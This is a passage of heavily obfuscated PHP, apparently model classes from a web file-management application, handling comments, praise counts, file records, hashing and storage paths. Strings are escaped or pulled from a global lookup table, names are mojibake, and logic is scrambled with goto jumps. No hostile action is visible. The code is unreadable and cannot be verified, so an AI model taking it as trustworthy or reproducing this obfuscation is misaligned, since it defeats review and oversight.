$bùØÇ ‚Ø[310]; } $FÅòäÔŒô[$bùØÇ ‚Ø[1555]] = $eËˆƒÎ³­Ø; $this->update(); } } goto dæƒÏ‘Òƒ¤; f•§è«†õ: class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\x65\156\x74"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\x61\155\145" => "\x63\157\x6d\x6d\145\156\x74\137\155\x65\164\141", "\x6d\145\x74\x61\x46\x69\x65\154\x64" => "\143\x6f\x6d\x6d\x65\x6e\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($cñİùë—âŒ) { $eßà«‹˜ä‘ =& $_SERVER[Šº]; if ($cñİùë—âŒ[$eßà«‹˜ä‘[1705]]) { $D×Ù°ç¡„¢ = $this->where(array($eßà«‹˜ä‘[1706] => $cñİùë—âŒ[$eßà«‹˜ä‘[1705]]))->find(); if (!$D×Ù°ç¡„¢ || $D×Ù°ç¡„¢[$eßà«‹˜ä‘[411]] != $cñİùë—âŒ[$eßà«‹˜ä‘[411]] || $D×Ù°ç¡„¢[$eßà«‹˜ä‘[491]] != $cñİùë—âŒ[$eßà«‹˜ä‘[491]]) { return !1; } $this->where(array($eßà«‹˜ä‘[1706] => $cñİùë—âŒ[$eßà«‹˜ä‘[1705]]))->setAdd($eßà«‹˜ä‘[1707], 1); } $cñİùë—âŒ[$eßà«‹˜ä‘[1708]] = 0; $cñİùë—âŒ[$eßà«‹˜ä‘[1707]] = 0; $cñİùë—âŒ[$eßà«‹˜ä‘[711]] = 1; return $this->add($cñİùë—âŒ); } public function commentCount($a‰Š˜ÆÇè×, $E—“øÄ°‚) { goto bˆØÒ¯…¥Ş; c›á¦Ü“Çø: $bÅ—ÙÔã¿ã = array($bäº­Ù†îù[491], $bäº­Ù†îù[1709] => $bäº­Ù†îù[487]); $C³®Å§©§ˆ = array($bäº­Ù†îù[491] => array($bäº­Ù†îù[7], $a‰Š˜ÆÇè×), $bäº­Ù†îù[411] => $E—“øÄ°‚); $Bõ®­•Ú§Š = $this->field($bÅ—ÙÔã¿ã)->where($C³®Å§©§ˆ)->group($bäº­Ù†îù[491])->select(); goto B‘Öšù‰–Ç; bˆØÒ¯…¥Ş: $bäº­Ù†îù =& $_SERVER[Šº]; if (!$a‰Š˜ÆÇè×) { return array(); } if (is_string($a‰Š˜ÆÇè×) || is_int($a‰Š˜ÆÇè×)) { $a‰Š˜ÆÇè× = array($a‰Š˜ÆÇè×); } goto c›á¦Ü“Çø; B‘Öšù‰–Ç: return array_to_keyvalue($Bõ®­•Ú§Š, $bäº­Ù†îù[491], $bäº­Ù†îù[487]); goto fš‰îµ±•; fš‰îµ±•: } public function remove($B¦•âß‡…£) { $aõŠîïäë¾ =& $_SERVER[Šº]; $B»†Îï½ì£ = array($aõŠîïäë¾[1706] => $B¦•âß‡…£); $D…ëø¡ÆÓÊ = $this->where($B»†Îï½ì£)->find(); if ($D…ëø¡ÆÓÊ[$aõŠîïäë¾[1705]]) { $this->where(array($aõŠîïäë¾[1706] => $D…ëø¡ÆÓÊ[$aõŠîïäë¾[1705]]))->setAdd($aõŠîïäë¾[1707], -1); } return $this->where($B»†Îï½ì£)->delete(); } public function edit($D‘Ú‘ÊÕØ, $d¦™‰ñ§õ‚) { $D¯è„â” =& $_SERVER[Šº]; $CŒºêÓõ»‘ = array($D¯è„â”[1706] => $D‘Ú‘ÊÕØ); return $this->where($CŒºêÓõ»‘)->save(array($D¯è„â”[1710] => $d¦™‰ñ§õ‚)); } public function prasise($fÆæÆ°®—) { $bï…Öôˆœ =& $_SERVER[Šº]; $AÄ¡ºæ¥Ú = Model($bï…Öôˆœ[1711]); $dÛ­ƒğùÒ = array($bï…Öôˆœ[1706] => $fÆæÆ°®—, $bï…Öôˆœ[1506] => USER_ID); $FÑÊ¥„ã–ª = $AÄ¡ºæ¥Ú->where($dÛ­ƒğùÒ)->find(); if (!$FÑÊ¥„ã–ª) { $AÄ¡ºæ¥Ú->add($dÛ­ƒğùÒ); $fÓĞÉ£ÕÊÂ = $this->where(array($bï…Öôˆœ[1706] => $fÆæÆ°®—))->setAdd($bï…Öôˆœ[1708], 1); } else { $AÄ¡ºæ¥Ú->where($dÛ­ƒğùÒ)->delete(); $fÓĞÉ£ÕÊÂ = $this->where(array($bï…Öôˆœ[1706] => $fÆæÆ°®—))->setAdd($bï…Öôˆœ[1708], -1); } return $fÓĞÉ£ÕÊÂ; } public function targetInfo($cÑŒàÛ˜Á¥, $EŠÃñÔ¼ù) { goto f×ƒÒ—; eâ‹ì·„Ã: return $cƒ–Ì†ƒ¼ã; goto AÙòïÔ¢òó; f×ƒÒ—: $cÕºÙ» Ëß =& $_SERVER[Šº]; $BŒ®¾Ä‘ƒÒ = array($cÕºÙ» Ëß[557] => $cÑŒàÛ˜Á¥, $cÕºÙ» Ëß[558] => $EŠÃñÔ¼ù); $fŒï¬æ°ò = $this->where($BŒ®¾Ä‘ƒÒ)->count(); goto bëÕÉñà±Ê; bëÕÉñà±Ê: $fÓŒ«øÖ» = "\x52\111\x47\x48\124\x20\x4a\117\111\116\x20{$this->tablePrefix}\143\x6f\155\x6d\145\x6e\x74\x5f\x70\162\141\x69\x73\145\x20\x73\x74\141\x72\40\157\156\x20\143\x6f\155\155\x65\156\x74\56\x63\x6f\x6d\155\x65\156\x74\x49\104\40\x3d\40\x73\x74\141\162\56\143\157\155\155\145\x6e\164\x49\104"; $Døê¨ÛŒã = $this->alias($cÕºÙ» Ëß[351])->where($BŒ®¾Ä‘ƒÒ)->join($fÓŒ«øÖ», $cÕºÙ» Ëß[1712])->count(); $cƒ–Ì†ƒ¼ã = array($cÕºÙ» Ëß[1713] => $fŒï¬æ°ò, $cÕºÙ» Ëß[1714] => $Døê¨ÛŒã); goto eâ‹ì·„Ã; AÙòïÔ¢òó: } public function listData($aëñÌ“…˜) { $c¹ÏØÂƒ› =& $_SERVER[Šº]; if (isset($aëñÌ“…˜[$c¹ÏØÂƒ›[1715]])) { if ($aëñÌ“…˜[$c¹ÏØÂƒ›[1715]]) { $aëñÌ“…˜[$c¹ÏØÂƒ›[1716]] = array($c¹ÏØÂƒ›[959], intval($aëñÌ“…˜[$c¹ÏØÂƒ›[1715]])); } unset($aëñÌ“…˜[$c¹ÏØÂƒ›[1715]]); } if (isset($aëñÌ“…˜[$c¹ÏØÂƒ›[1717]])) { if ($aëñÌ“…˜[$c¹ÏØÂƒ›[1717]]) { $aëñÌ“…˜[$c¹ÏØÂƒ›[1716]] = array($c¹ÏØÂƒ›[956], intval($aëñÌ“…˜[$c¹ÏØÂƒ›[1717]])); } unset($aëñÌ“…˜[$c¹ÏØÂƒ›[1717]]); } return $this->_listData($aëñÌ“…˜); } private function _listData($bŠ²õÙ¡ ) { $e´ƒá½È¦ =& $_SERVER[Šº]; $EêíØö„‚Â = $this->where($bŠ²õÙ¡ )->_makeOrder()->selectPage(100); $this->_listAppendParent($EêíØö„‚Â[$e´ƒá½È¦[366]]); $this->_listAppendUser($EêíØö„‚Â[$e´ƒá½È¦[366]]); $this->_listAppendMeta($EêíØö„‚Â[$e´ƒá½È¦[366]]); return $EêíØö„‚Â; } private function _makeOrder() { $C¾·Ä™¹½¢ =& $_SERVER[Šº]; $eŠšª¬Ç¨ = array($C¾·Ä™¹½¢[1708], $C¾·Ä™¹½¢[1707], $C¾·Ä™¹½¢[193]); $e™â‡ˆ¨Šñ = Input::get($C¾·Ä™¹½¢[442], $C¾·Ä™¹½¢[7], $C¾·Ä™¹½¢[423], $eŠšª¬Ç¨); $E‹«ÁÃçß = Input::get($C¾·Ä™¹½¢[443], $C¾·Ä™¹½¢[7], $C¾·Ä™¹½¢[1508], array($C¾·Ä™¹½¢[1718], $C¾·Ä™¹½¢[438])); $A¬è„…ñ˜” = $e™â‡ˆ¨Šñ . $C¾·Ä™¹½¢[50] . $E‹«ÁÃçß; return $this->order($A¬è„…ñ˜”); } private function _listAppendParent(&$AÙù ¯½¿ã) { goto e¾„Şßë©; EÅïÔË³ã¯: foreach ($AÙù ¯½¿ã as &$FÇ•ó–µÙ) { if (isset($dÔç¨èòó˜[$FÇ•ó–µÙ[$CÎåÏÊèéÜ[1705]]])) { $FÇ•ó–µÙ[$CÎåÏÊèéÜ[1719]] = $dÔç¨èòó˜[$FÇ•ó–µÙ[$CÎåÏÊèéÜ[1705]]]; } } unset($FÇ•ó–µÙ); goto AŠ‰¼Ç©²½; EãÅ©“¾¸Ö: if (!$bƒÅÔ·œ ¡) { return; } $dÔç¨èòó˜ = $this->where(array($CÎåÏÊèéÜ[1706] => array($CÎåÏÊèéÜ[7], $bƒÅÔ·œ ¡)))->select(); $dÔç¨èòó˜ = array_to_keyvalue($dÔç¨èòó˜, $CÎåÏÊèéÜ[1716]); goto EÅïÔË³ã¯; e¾„Şßë©: $CÎåÏÊèéÜ =& $_SERVER[Šº]; $bƒÅÔ·œ ¡ = array_unique(array_to_keyvalue($AÙù ¯½¿ã, $CÎåÏÊèéÜ[33], $CÎåÏÊèéÜ[1705])); $bƒÅÔ·œ ¡ = array_remove_value($bƒÅÔ·œ ¡, $CÎåÏÊèéÜ[504]); goto EãÅ©“¾¸Ö; AŠ‰¼Ç©²½: } private function _listAppendUser(&$FÈ³šùùŞ™) { goto cÙÅ©ã•; cÙÅ©ã•: $BÍÚ½ùõÌè =& $_SERVER[Šº]; $c¬åø…ÃŞÑ = array_unique(array_to_keyvalue($FÈ³šùùŞ™, $BÍÚ½ùõÌè[33], $BÍÚ½ùõÌè[1514])); $c¬åø…ÃŞÑ = array_remove_value($c¬åø…ÃŞÑ, $BÍÚ½ùõÌè[504]); goto f’·¦ˆ‰ŞØ; f’·¦ˆ‰ŞØ: if (count($c¬åø…ÃŞÑ) == 0) { return; } foreach ($FÈ³šùùŞ™ as $BˆŒ”Õä—) { if (isset($BˆŒ”Õä—[$BÍÚ½ùõÌè[1719]])) { $c¬åø…ÃŞÑ[] = $BˆŒ”Õä—[$BÍÚ½ùõÌè[1719]][$BÍÚ½ùõÌè[1514]]; } } $FÙ·àî„®Í = Model($BÍÚ½ùõÌè[514])->userListInfo($c¬åø…ÃŞÑ); goto E°ä‚Ÿ±; E°ä‚Ÿ±: foreach ($FÈ³šùùŞ™ as &$BˆŒ”Õä—) { $BˆŒ”Õä—[$BÍÚ½ùõÌè[570]] = $FÙ·àî„®Í[$BˆŒ”Õä—[$BÍÚ½ùõÌè[1514]]]; if (isset($BˆŒ”Õä—[$BÍÚ½ùõÌè[1719]])) { $BˆŒ”Õä—[$BÍÚ½ùõÌè[1719]][$BÍÚ½ùõÌè[570]] = $FÙ·àî„®Í[$BˆŒ”Õä—[$BÍÚ½ùõÌè[1719]][$BÍÚ½ùõÌè[1514]]]; } } unset($BˆŒ”Õä—); goto d…—–•‹ˆÉ; d…—–•‹ˆÉ: } private function _listAppendMeta(&$e³’àçÔŠ) { goto dÃ¸¨‚‘íâ; aôÃïƒó­¼: if (!$f†¾É—»š) { return !1; } foreach ($e³’àçÔŠ as &$Cä´¸À‹¬ã) { $Cä´¸À‹¬ã[$aƒ¼•É–¨[452]] = $f†¾É—»š[$Cä´¸À‹¬ã[$aƒ¼•É–¨[1716]]]; if (isset($Cä´¸À‹¬ã[$aƒ¼•É–¨[1719]])) { $Cä´¸À‹¬ã[$aƒ¼•É–¨[1719]][$aƒ¼•É–¨[452]] = $f†¾É—»š[$Cä´¸À‹¬ã[$aƒ¼•É–¨[1719]][$aƒ¼•É–¨[1716]]]; } } unset($Cä´¸À‹¬ã); goto dŸñÓØî˜; B™•¯·ñÒ: if (!$AŒ‚°”ëç) { return; } foreach ($e³’àçÔŠ as $Cä´¸À‹¬ã) { if (isset($Cä´¸À‹¬ã[$aƒ¼•É–¨[1719]])) { $AŒ‚°”ëç[] = $Cä´¸À‹¬ã[$aƒ¼•É–¨[1719]][$aƒ¼•É–¨[1716]]; } } $f†¾É—»š = $this->metaList($AŒ‚°”ëç); goto aôÃïƒó­¼; dÃ¸¨‚‘íâ: $aƒ¼•É–¨ =& $_SERVER[Šº]; $AŒ‚°”ëç = array_unique(array_to_keyvalue($e³’àçÔŠ, $aƒ¼•É–¨[33], $aƒ¼•É–¨[1716])); $AŒ‚°”ëç = array_remove_value($AŒ‚°”ëç, $aƒ¼•É–¨[504]); goto B™•¯·ñÒ; dŸñÓØî˜: } private function metaList($a’Ò‰³ÍŞ½) { goto fÛ¤Ú¼È•è; fÛ¤Ú¼È•è: $BÊãğ¸Ç¶ =& $_SERVER[Šº]; if (!$a’Ò‰³ÍŞ½) { return array(); } $c¹îÓŒ“ = array($BÊãğ¸Ç¶[1716] => array($BÊãğ¸Ç¶[7], $a’Ò‰³ÍŞ½)); goto e†É«¤¦’; aŞ•‰æÊŠ: return $bÙß‹„­…ê ? $bÙß‹„­…ê : array(); goto aøÍÀ½ê‰„; e†É«¤¦’: $bÙß‹„­…ê = Model($BÊãğ¸Ç¶[1720])->where($c¹îÓŒ“)->select(); $bÙß‹„­…ê = array_to_keyvalue_group($bÙß‹„­…ê, $BÊãğ¸Ç¶[1716]); foreach ($bÙß‹„­…ê as $CğÆŒ†ïßà => $aÜŸŞ£“ ê) { $FÅğÓÉ¢à = array(); foreach ($aÜŸŞ£“ ê as $EµëÃÑİ‡‘) { $FÅğÓÉ¢à[$EµëÃÑİ‡‘[$BÊãğ¸Ç¶[93]]] = $EµëÃÑİ‡‘[$BÊãğ¸Ç¶[371]]; } $bÙß‹„­…ê[$CğÆŒ†ïßà] = $FÅğÓÉ¢à; } goto aŞ•‰æÊŠ; aøÍÀ½ê‰„: } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\x69\x6c\x65\137\143\157\156\x74\145\156\164\x73"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\124\x69\155\x65", "\x74\x69\155\145", "\151\156\x73\x65\x72\x74", "\x66\x75\156\x63\164\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\154\x65"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\141\x6d\x65" => "\151\157\137\x66\x69\154\145\137\155\145\x74\141", "\155\x65\164\x61\x46\151\x65\x6c\x64" => "\x66\151\x6c\x65\x49\x44"); public function fileInfo($FÖèã‰ğá´) { $D‡‰ö²˜â =& $_SERVER[Šº]; static $aŠçô®£Ù = array(); if (!isset($aŠçô®£Ù[$FÖèã‰ğá´])) { $C„ÓÉ¡å©î = $D‡‰ö²˜â[1721]; $B¬¯¥ÌÍ£ = Model($D‡‰ö²˜â[457])->field($C„ÓÉ¡å©î)->where(array($D‡‰ö²˜â[455] => $FÖèã‰ğá´))->find(); $aŠçô®£Ù[$FÖèã‰ğá´] = $B¬¯¥ÌÍ£; } return $aŠçô®£Ù[$FÖèã‰ğá´]; } public function addFileByContent($E¡·¸„Š = '', $bÂÜÀÒÈâ© = '') { goto EáäË±ô; b·½È…ĞÄ“: if (file_exists($DÏ‘”¨‰Ÿ‰)) { @unlink($DÏ‘”¨‰Ÿ‰); } return $b°õÎî‰; goto eÑƒãåŠÁ­; EáäË±ô: $AíÀ¬Ï¤î =& $_SERVER[Šº]; $DáäÙø É = TEMP_PATH . $AíÀ¬Ï¤î[1722]; if (!is_dir($DáäÙø É)) { mk_dir($DáäÙø É); } goto CƒØ¾š¼Õ; CƒØ¾š¼Õ: $DÏ‘”¨‰Ÿ‰ = $DáäÙø É . $AíÀ¬Ï¤î[1723] . rand_string(16); file_put_contents($DÏ‘”¨‰Ÿ‰, $E¡·¸„Š); $b°õÎî‰ = $this->addFile($DÏ‘”¨‰Ÿ‰, $bÂÜÀÒÈâ©, !0); goto b·½È…ĞÄ“; eÑƒãåŠÁ­: } public function createFileName($DœÑ¶Ÿéˆ, $bÄÓï˜†Ü = false, $b¿ÉÔó¡¨¥ = false) { goto B®”õ´Ê‹¼; EÆŒ‡œÔÒ‡: if (!$eó×æÎ²¾ && !Cache::get($d‹ Ö³õí‡)) { $eó×æÎ²¾ = !0; $dŸŸ—Øòñó = IO::mkdir($B¸‘ğæ¸õ¶); if (!IO::exist($dŸŸ—Øòñó . $BŸÌÃšË›[759])) { IO::mkfile($dŸŸ—Øòñó . $BŸÌÃšË›[759]); } Cache::set($d‹ Ö³õí‡, 1, 3600 * 2); } return $aïæ²îÏ‘¤; goto dÊ³“ÕàÜñ; B®”õ´Ê‹¼: $BŸÌÃšË› =& $_SERVER[Šº]; $BÔåÈø¢½— = IO::init($BŸÌÃšË›[8]); $aïæ²îÏ‘¤ = $this->makeFilePath($DœÑ¶Ÿéˆ, $BÔåÈø¢½—, $bÄÓï˜†Ü, $b¿ÉÔó¡¨¥); goto cµßÓºŞ; cµßÓºŞ: $B¸‘ğæ¸õ¶ = $BÔåÈø¢½—->pathFather($aïæ²îÏ‘¤); static $eó×æÎ²¾ = false; $d‹ Ö³õí‡ = $BŸÌÃšË›[1724] . md5($B¸‘ğæ¸õ¶); goto EÆŒ‡œÔÒ‡; dÊ³“ÕàÜñ: } public function makeFilePath($BˆøÃÈº„, $fÎæ»ŠŸŠ—, $B×Á¢¯ƒÆ = false, $bš‘¬à = false) { goto e°ˆœĞ¾í; e°ˆœĞ¾í: $c×»…£ÀÚ† =& $_SERVER[Šº]; $b³îºÂñ¥ˆ = Model($c×»…£ÀÚ†[728])->get($c×»…£ÀÚ†[1725]); $BÆ¬¹Ğ…ø = KodIO::defaultIO() . date($c×»…£ÀÚ†[1726]); goto dÁĞÙÁ­; dÁĞÙÁ­: $A¸Ÿ×µóË© = $BÆ¬¹Ğ…ø . rand_string(5) . short_id(100); $BˆøÃÈº„ = str_replace($c×»…£ÀÚ†[8], $c×»…£ÀÚ†[71], KodIO::clear($BˆøÃÈº„)); $aĞù‰š‚»ò = $fÎæ»ŠŸŠ—->ext($BˆøÃÈº„); goto CìÚ‹»ƒÌ¢; CìÚ‹»ƒÌ¢: if (!$BˆøÃÈº„) { $b³îºÂñ¥ˆ = $c×»…£ÀÚ†[1727]; } switch ($b³îºÂñ¥ˆ) { case $c×»…£ÀÚ†[1728]: $A¸Ÿ×µóË© = $A¸Ÿ×µóË© . $c×»…£ÀÚ†[95] . $fÎæ»ŠŸŠ—->ext($BˆøÃÈº„); if ($aĞù‰š‚»ò == $c×»…£ÀÚ†[1667]) { $A¸Ÿ×µóË© .= $c×»…£ÀÚ†[1416]; } break; case $c×»…£ÀÚ†[1729]: goto b¼Ó¬î¦•‚; b¼Ó¬î¦•‚: $B÷èø‰ë·õ = Model($c×»…£ÀÚ†[728])->get($c×»…£ÀÚ†[729]); $A™Ë¹—©™á = substr(md5($c×»…£ÀÚ†[730] . $B÷èø‰ë·õ . date($c×»…£ÀÚ†[709])), 0, 8); $d·¡ƒ³ğ‹ = KodIO::defaultDriver(); goto E…âĞê†İõ; c½ß²çÎÛõ: if (IO::isTypeObject($A¸Ÿ×µóË©) && !IO::isUploadServer($A¸Ÿ×µóË©)) { if (IO::exist($A¸Ÿ×µóË©)) { return $A¸Ÿ×µóË©; } $Cæ³âòğí = IO::setContent($A¸Ÿ×µóË©, $c×»…£ÀÚ†[33]); if (!$Cæ³âòğí) { show_json($c×»…£ÀÚ†[1732], !1); } } CacheLock::unlock($dø†¶çÈ); break; goto c†‡é¬ô»ó; CÌªï‚Ò“š: CacheLock::lock($dø†¶çÈ); $A¸Ÿ×µóË© = $BÆ¬¹Ğ…ø . $BˆøÃÈº„; if (IO::exist($BÆ¬¹Ğ…ø . $BˆøÃÈº„)) { $EßÃ³Ğ¹‘¼ = substr($BˆøÃÈº„, 0, strlen($BˆøÃÈº„) - strlen($aĞù‰š‚»ò)); $D÷À¯Ç®Ã = $bš‘¬à ? substr($bš‘¬à, 0, 5) : ($B×Á¢¯ƒÆ ? substr($B×Á¢¯ƒÆ, 0, 5) : rand_string(5)); $A¸Ÿ×µóË© = $BÆ¬¹Ğ…ø . $EßÃ³Ğ¹‘¼ . $D÷À¯Ç®Ã . $c×»…£ÀÚ†[95] . $aĞù‰š‚»ò; } goto c½ß²çÎÛõ; E…âĞê†İõ: $BÆ¬¹Ğ…ø = $c×»…£ÀÚ†[1111] . $d·¡ƒ³ğ‹[$c×»…£ÀÚ†[392]] . $c×»…£ÀÚ†[409] . date($c×»…£ÀÚ†[1730]) . $A™Ë¹—©™á . $c×»…£ÀÚ†[8]; if ($aĞù‰š‚»ò == $c×»…£ÀÚ†[1667]) { $BˆøÃÈº„ .= $c×»…£ÀÚ†[1416]; } $dø†¶çÈ = $c×»…£ÀÚ†[1731] . $BÆ¬¹Ğ…ø . $BˆøÃÈº„; goto CÌªï‚Ò“š; c†‡é¬ô»ó: case $c×»…£ÀÚ†[1727]: break; default: break; } return $A¸Ÿ×µóË©; goto e•õŞ»ĞÏ; e•õŞ»ĞÏ: } public function addFileByRemote($B­Òöµ§†¬, $fÂº—»ºĞ®, $Fº¬’ÍêŞ¾ = array()) { goto E›Û‰Ò–Ú; BŠ¯‰ØàßÎ: if ($aè„’È‡³Ã = $this->addFileCheckExist($d™ÓõÒ£Î[$bØ†¯ô¥ÌĞ[171]], $d™ÓõÒ£Î[$bØ†¯ô¥ÌĞ[170]], $d™ÓõÒ£Î[$bØ†¯ô¥ÌĞ[78]])) { return $aè„’È‡³Ã; } return $this->addFileData($d™ÓõÒ£Î); goto còŸ×Ö°¼£; E›Û‰Ò–Ú: $bØ†¯ô¥ÌĞ =& $_SERVER[Šº]; if (!IO::exist($B­Òöµ§†¬)) { return !1; } $eä¡åê”¬½ = $Fº¬’ÍêŞ¾[$bØ†¯ô¥ÌĞ[170]] ? $Fº¬’ÍêŞ¾[$bØ†¯ô¥ÌĞ[170]] : $bØ†¯ô¥ÌĞ[33]; goto CÇªíŒÜ; CÇªíŒÜ: $Bì•®Ç¯ = IO::hashMd5($B­Òöµ§†¬, $eä¡åê”¬½); $cƒßÑÄ¶‹Á = KodIO::defaultDriver(); $d™ÓõÒ£Î = array($bØ†¯ô¥ÌĞ[556] => IO::size($B­Òöµ§†¬), $bØ†¯ô¥ÌĞ[1733] => 1, $bØ†¯ô¥ÌĞ[420] => $fÂº—»ºĞ®, $bØ†¯ô¥ÌĞ[771] => $cƒßÑÄ¶‹Á[$bØ†¯ô¥ÌĞ[392]], $bØ†¯ô¥ÌĞ[421] => $B­Òöµ§†¬, $bØ†¯ô¥ÌĞ[1734] => $Fº¬’ÍêŞ¾[$bØ†¯ô¥ÌĞ[171]] ? $Fº¬’ÍêŞ¾[$bØ†¯ô¥ÌĞ[171]] : IO::hashSimple($B­Òöµ§†¬), $bØ†¯ô¥ÌĞ[1735] => $Bì•®Ç¯ ? $Bì•®Ç¯ : $eä¡åê”¬½); goto BŠ¯‰ØàßÎ; còŸ×Ö°¼£: } private function addFileData($AØÚÜ—Öï) { $FŞ¯Úß³Àñ =& $_SERVER[Šº]; if (!$AØÚÜ—Öï) { return !1; } $AØÚÜ—Öï[$FŞ¯Úß³Àñ[78]] = intval($AØÚÜ—Öï[$FŞ¯Úß³Àñ[78]]); if (!$AØÚÜ—Öï[$FŞ¯Úß³Àñ[78]] && strlen($AØÚÜ—Öï[$FŞ¯Úß³Àñ[171]]) > 32) { $AØÚÜ—Öï[$FŞ¯Úß³Àñ[78]] = intval(substr($AØÚÜ—Öï[$FŞ¯Úß³Àñ[171]], 32)); } $AæÌï¸‡Äì = $this->add($AØÚÜ—Öï); return $this->find($AæÌï¸‡Äì); } public function addFile($d”Öîéë±í, $FÂçÕé’¿Æ, $A á¯˜·ø‹ = false) { goto c¨„°Áç¶è; A«¦·ò¼: return $C š³ÊÊÒ·; goto fˆø®­¦Ö; c¨„°Áç¶è: $FçÕÛ”È¦­ = IO::hashSimple($d”Öîéë±í); $Aõ¤è¡ – = IO::hashMd5($d”Öîéë±í); $a–ƒùœ‘¼ß = IO::size($d”Öîéë±í); goto CøÑ²Ÿ±“; C‚º÷ÉÜõö: $BÔÏ‚†Î£À = $this->addFileMake($d”Öîéë±í, $a–ƒùœ‘¼ß, $FçÕÛ”È¦­, $Aõ¤è¡ –, $FÂçÕé’¿Æ, $A á¯˜·ø‹); $C š³ÊÊÒ· = $this->addFileData($BÔÏ‚†Î£À); CacheLock::unlock($AÒÄ„Ë±ºî); goto A«¦·ò¼; CøÑ²Ÿ±“: $AÒÄ„Ë±ºî = $_SERVER[Šº][1736] . $Aõ¤è¡ –; CacheLock::lock($AÒÄ„Ë±ºî); if ($bÜ¿æóÖõ = $this->addFileCheckExist($FçÕÛ”È¦­, $Aõ¤è¡ –, $a–ƒùœ‘¼ß)) { CacheLock::unlock($AÒÄ„Ë±ºî); return $bÜ¿æóÖõ; } goto C‚º÷ÉÜõö; fˆø®­¦Ö: } public function addFileMake($E‡„“™â¤, $C¦„Í¿„³Š, $AŒ“ °İÕ™, $BâŒ¼ƒÎ†, $a­’†—‘…â, $déË¨³­¨) { goto eÏ˜Ê§ö; A¨£Ó÷áÙ: $ağ…ÚƒÚ = get_path_this($c¹‹Åæ¬×); if ($déË¨³­¨) { $dõÚ‚Áèô‘ = IO::move($E‡„“™â¤, $c°ß‡ĞŞ·Ê, !1, $ağ…ÚƒÚ); } else { $dõÚ‚Áèô‘ = IO::copy($E‡„“™â¤, $c°ß‡ĞŞ·Ê, !1, $ağ…ÚƒÚ); } if (!$dõÚ‚Áèô‘) { return !1; } goto f›Éë¸’é¾; f›Éë¸’é¾: $F‡†ÛÑˆÅ = KodIO::defaultDriver(); $CÃ‚è¥«‡ï = array($Bí¡‡ˆÙÆÂ[556] => $C¦„Í¿„³Š, $Bí¡‡ˆÙÆÂ[1733] => 1, $Bí¡‡ˆÙÆÂ[420] => $a­’†—‘…â, $Bí¡‡ˆÙÆÂ[771] => $F‡†ÛÑˆÅ[$Bí¡‡ˆÙÆÂ[392]], $Bí¡‡ˆÙÆÂ[421] => $c¹‹Åæ¬×, $Bí¡‡ˆÙÆÂ[1734] => $AŒ“ °İÕ™, $Bí¡‡ˆÙÆÂ[1735] => $BâŒ¼ƒÎ†); return $CÃ‚è¥«‡ï; goto EÇ¢âĞƒÙñ; eÏ˜Ê§ö: $Bí¡‡ˆÙÆÂ =& $_SERVER[Šº]; $c¹‹Åæ¬× = $this->createFileName($a­’†—‘…â, $AŒ“ °İÕ™, $BâŒ¼ƒÎ†); $c°ß‡ĞŞ·Ê = get_path_father($c¹‹Åæ¬×); goto A¨£Ó÷áÙ; EÇ¢âĞƒÙñ: } public function addFileCheckExist($f¿‡¤îàÅ¨, $C„ÒÙ“ÚøÀ, $BÙÉÈô£Ñ) { $Cß¿ßÇÊ• =& $_SERVER[Šº]; $B¸§ö†£Ãà = $this->findByHash($f¿‡¤îàÅ¨, $C„ÒÙ“ÚøÀ); if (!$B¸§ö†£Ãà) { return !1; } $cë•Ç²Ò‡ = array($Cß¿ßÇÊ•[1733] => intval($B¸§ö†£Ãà[$Cß¿ßÇÊ•[1737]]) + 1, $Cß¿ßÇÊ•[556] => $BÙÉÈô£Ñ); $this->where(array($Cß¿ßÇÊ•[455] => $B¸§ö†£Ãà[$Cß¿ßÇÊ•[454]]))->save($cë•Ç²Ò‡); return $B¸§ö†£Ãà; } public function remove($BÅõìŒÂ‡˜) { $this->linkCountChange($BÅõìŒÂ‡˜, !1); $this->clearEmpty(); return !0; } public function linkAdd($d—ùÁÀáì) { $this->linkCountChange($d—ùÁÀáì, !0); } public function linkCountChange($f±‹‡ª÷–ì, $BÍàœ¯ƒÛ«) { goto dŞ£Ñ‹Ö; dŞ£Ñ‹Ö: $cÀ—‰Õìë =& $_SERVER[Šº]; if (!$f±‹‡ª÷–ì) { return; } if (!is_array($f±‹‡ª÷–ì)) { $f±‹‡ª÷–ì = array($f±‹‡ª÷–ì); } goto BÜàáêš¦; b¤îÒ•ƒŸ‡: foreach ($dæ‹Šç¯ìƒ as $EÈ¦È¾ÇÁ => $f†¥øÀ’Õê) { $aËªğ††‰ = $f†¥øÀ’Õê . $cÀ—‰Õìë[33]; if (!$b«Ö¨™ÂùÉ[$aËªğ††‰]) { $b«Ö¨™ÂùÉ[$aËªğ††‰] = array(); } $b«Ö¨™ÂùÉ[$aËªğ††‰][] = $EÈ¦È¾ÇÁ; } foreach ($b«Ö¨™ÂùÉ as $f†¥øÀ’Õê => $Fíšµ£„¡¬) { if (!$Fíšµ£„¡¬) { continue; } $f†¥øÀ’Õê = $BÍàœ¯ƒÛ« ? $f†¥øÀ’Õê : -intval($f†¥øÀ’Õê); $E†ÉáÒÏÔ = array($cÀ—‰Õìë[454] => array($cÀ—‰Õìë[7], $Fíšµ£„¡¬)); if ($f†¥øÀ’Õê < 0) { $E†ÉáÒÏÔ[$cÀ—‰Õìë[1737]] = array($cÀ—‰Õìë[960], abs($f†¥øÀ’Õê)); } $this->where($E†ÉáÒÏÔ)->setAdd($cÀ—‰Õìë[1737], $f†¥øÀ’Õê); } goto bĞ±é˜Ê·¯; BÜàáêš¦: $dæ‹Šç¯ìƒ = array(); foreach ($f±‹‡ª÷–ì as $EÈ¦È¾ÇÁ) { $aËªğ††‰ = $EÈ¦È¾ÇÁ . $cÀ—‰Õìë[33]; if (!$dæ‹Šç¯ìƒ[$aËªğ††‰]) { $dæ‹Šç¯ìƒ[$aËªğ††‰] = 0; } $dæ‹Šç¯ìƒ[$aËªğ††‰]++; } $b«Ö¨™ÂùÉ = array(); goto b¤îÒ•ƒŸ‡; bĞ±é˜Ê·¯: } public function findByHash($DƒŒ®î™Ö, $B¼Ô¹ˆËËŸ = false) { $BØùƒ‘Š½‹ =& 